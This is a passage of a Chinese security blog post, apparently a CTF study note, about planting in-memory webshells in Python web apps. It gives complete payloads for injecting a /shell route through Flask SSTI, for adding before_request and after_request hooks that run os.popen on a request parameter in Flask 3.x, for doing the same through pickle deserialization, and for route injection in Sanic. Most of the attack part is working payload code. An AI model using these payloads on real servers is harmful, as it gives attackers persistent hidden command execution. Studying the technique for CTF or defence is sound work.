+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].debug=<span class="literal">False</span></span><br><span class="line">sys.modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].add_url_rule(<span class="string">&#x27;/shell&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir&#x27;</span>).read())</span><br></pre></td></tr></table></figure>
+
+<p>直接在app.py中添加后访问&#x2F;shell路由</p>
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609134240706.png" alt="image-20250609134240706"></p>
+<p>成功执行dir命令，那我们试图构造一下poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>我们分析一下这个poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><code>url_for</code>是<code>Flask</code>的一个内置函数, 通过<code>Flask</code>内置函数可以调用其<code>__globals__</code>属性, 该特殊属性能够返回函数所在模块命名空间的所有变量, 其中包含了很多已经引入的<code>modules</code>, 可以看到这里是支持<code>__builtins__</code>的，并且在<code>__builtins__</code>模块中是存在<code>eval</code>、<code>exec</code>等内置的命令执行函数的.</p>
+<p>由于存在命令执行函数, 因此我们就可以直接调用命令执行函数来执行危险操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(<span class="string">&#x27;/shell&#x27;</span>, <span class="string">&#x27;shell&#x27;</span>, <span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)).read())</span><br></pre></td></tr></table></figure>
+
+<p>这里的话是动态添加了一条路由shell，而处理该路由的函数是个由<code>lambda</code>关键字定义的匿名函数</p>
+<p>在<code>Flask</code>中注册路由的时候是添加的<code>@app.route()</code>装饰器来实现的, 跟进查看其源码实现, 发现其调用了<code>add_url_rule</code>函数来添加路由.</p>
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609140546272.png" alt="image-20250609140546272"></p>
+<p>然后我们跟进app.add_url_rule函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_url_rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    rule: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    endpoint: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    view_func: ft.RouteCallable | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    provide_automatic_options: <span class="built_in">bool</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    **options: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>rule: 函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头.</li>
+<li>endpoint: 端点, 即在使用<code>url_for</code>进行反转的时候, 这里传入的第一个参数就是<code>endpoint</code>对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为<code>endpoint</code>的值.</li>
+<li>view_func: <code>URL</code>对应的函数, 这里只需写函数名字而不用加括号.</li>
+<li>provide_automatic_options: 控制是否应自动添加选项方法.</li>
+<li>options: 要转发到基础规则对象的选项.</li>
+</ul>
+<p>结合我们的poc分析，<code>Payload</code>中<code>add_url_rule</code>函数的第三个参数定义了一个<code>lambda</code>匿名函数, 其中通过<code>os</code>库的<code>popen</code>函数执行从<code>Web</code>请求中获取的<code>cmd</code>参数值并返回结果, 其中该参数值默认为<code>whoami</code>。</p>
+<p>然后我们再来看最后一部分</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话是获取了一个_request_ctx_stack全局变量，以及获取当前的app</p>
+<p>所以到这里分析完了之后我们就大概可以知道一整个流程是怎么做的了，<code>eval</code>函数的功能即动态创建一条路由, 并在后面指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到</p>
+<p>我们通过ssti执行poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传参后访问&#x2F;shell路由发现初始的cmd值whoami成功执行</p>
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609134451361.png" alt="image-20250609134451361"></p>
+<p>然后传入cmd参数可以执行命令</p>
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609134557790.png" alt="image-20250609134557790"></p>
+<h2 id="0x03新版Flask下的内存马"><a href="#0x03新版Flask下的内存马" class="headerlink" title="0x03新版Flask下的内存马"></a>0x03新版Flask下的内存马</h2><p>参考文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p>
+<p>我们现在将Flask更新一下，更新到Flask3. x版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade flask</span><br></pre></td></tr></table></figure>
+
+<p>此时我的版本是flask-3.1.1 werkzeug-3.1.3</p>
+<p>然后我们试一下刚刚的poc发现出现报错了，这是为什么呢？</p>
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609135108942.png" alt="image-20250609135108942"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssertionError: The setup method &#x27;add_url_rule&#x27; can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.</span><br><span class="line">Make sure all imports, decorators, functions, etc. needed to set up the application are done before running it.</span><br></pre></td></tr></table></figure>
+
+<p>出现了报错？难道是我debug没关吗？但是关掉了还是这样，这是为啥？在文章中师傅指出，这是因为触发了一个check函数才造成的无法调用，但是最终还是因为flask版本问题，所以就引出了新版本的flask内存马</p>
+<p>首先我们得先了解两个方法before_request after_request</p>
+<p>[<a target="_blank" rel="noopener" href="https://geek-docs.com/flask/flask-questions/69_flask_python_flask_after_request_and_before_request_for_a_specific_set_of_request.html">Flask 使用 after_request 和 before_request 处理特定请求的方法|极客教程 (geek-docs.com)</a>]</p>
+<h3 id="使用before-request方法"><a href="#使用before-request方法" class="headerlink" title="使用before_request方法"></a>使用before_request方法</h3><p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609141032945.png" alt="image-20250609141032945"></p>
+<p>由于这是在请求之前执行的操作，所以会在我们每次请求的时候调用这个方法，我们跟进看一下这个函数</p>
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609141344088.png" alt="image-20250609141344088"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br></pre></td></tr></table></figure>
+
+<p>扔给ai解释一下</p>
+<table>
+<thead>
+<tr>
+<th><code>before_request_funcs</code></th>
+<th>Flask 应用内部的字典，存储所有请求前处理器（<code>before_request</code> 函数）。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.setdefault(None, [])</code></td>
+<td>若字典中键 <code>None</code> 不存在，则将其值设为空列表 <code>[]</code>，否则返回现有值。</td>
+</tr>
+<tr>
+<td><code>.append(f)</code></td>
+<td>将函数 <code>f</code> 添加到 <code>None</code> 键对应的列表中。</td>
+</tr>
+</tbody></table>
+<p>这里只要我们设置f为一个匿名函数就行，类似之前的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>所以我们尝试调用这个函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609141926329.png" alt="image-20250609141926329"></p>
+<p>成功了</p>
+<h3 id="使用-after-request方法"><a href="#使用-after-request方法" class="headerlink" title="使用 after_request方法"></a>使用 after_request方法</h3><p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609142028036.png" alt="image-20250609142028036"></p>
+<p>同样的，这个方法是在每个请求处理完成之后执行的，我们跟进一下这个函数</p>
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609142124488.png" alt="image-20250609142124488"></p>
+<p>和之前那个没区别，直接参考大佬的构造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在请求完成后调用,跟上面那个一样，唯一需要注意的是这个是需要定义一个返回值的，不然就报错。</p>
+<p>放在ssti的话就是通过模块去调用eval函数了</p>
+<p>除此之外还有其他的几个构造函数</p>
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/3181170-20240509130942991-1709772057.png" alt="img"></p>
+<h2 id="0x04回顾赛题"><a href="#0x04回顾赛题" class="headerlink" title="0x04回顾赛题"></a>0x04回顾赛题</h2><p>既然学的差不多了，那我们重新返回刚刚的赛题看看</p>
+<p>利用构造poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;gxngxngxn&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;gxngxngxn\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05sanic下的内存马"><a href="#0x05sanic下的内存马" class="headerlink" title="0x05sanic下的内存马"></a>0x05sanic下的内存马</h2><p>第一种依旧是路由注入，但poc上有一些不一样</p>
+<p>测试代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> json,text</span><br><span class="line"></span><br><span class="line">app = Sanic(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">request</span>):</span><br><span class="line">    cmd = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">eval</span>(cmd))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="路由注入"><a href="#路由注入" class="headerlink" title="路由注入"></a>路由注入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.add_route(<span class="keyword">lambda</span> request: <span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(request.args.get(<span class="string">&quot;cmd&quot;</span>)).read(),<span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x01前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是内存马？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpython%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">什么是python内存马？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%97%A7%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">0x02旧版Flask下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E9%A2%98%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.</span> <span class="toc-text">赛题环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.</span> <span class="toc-text">debug模式下的报错回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.4.</span> <span class="toc-text">路由注入的内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E6%96%B0%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">0x03新版Flask下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8before-request%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">使用before_request方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-after-request%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">使用 after_request方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E5%9B%9E%E9%A1%BE%E8%B5%9B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">0x04回顾赛题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05sanic%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">5.</span> <span class="toc-text">0x05sanic下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">路由注入</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&text=一些python内存马的学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&is_video=false&description=一些python内存马的学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一些python内存马的学习&body=Check out this article: https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&name=一些python内存马的学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&t=一些python内存马的学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
